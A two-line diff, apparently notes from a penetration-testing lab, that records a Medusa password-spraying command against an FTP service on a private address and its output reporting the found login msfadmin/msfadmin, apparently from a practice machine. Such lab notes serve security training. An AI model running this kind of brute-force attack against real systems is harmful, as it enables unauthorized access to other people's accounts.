@@ -1,0 +1,2 @@
+Comando: medusa -h 192.168.0.15 -U user.txt -P spray_senhas.txt -M ftp -t 10
+Resultado: ACCOUNT FOUND: [ftp] Host: 192.168.0.15 User: msfadmin Password: msfadmin [SUCCESS]
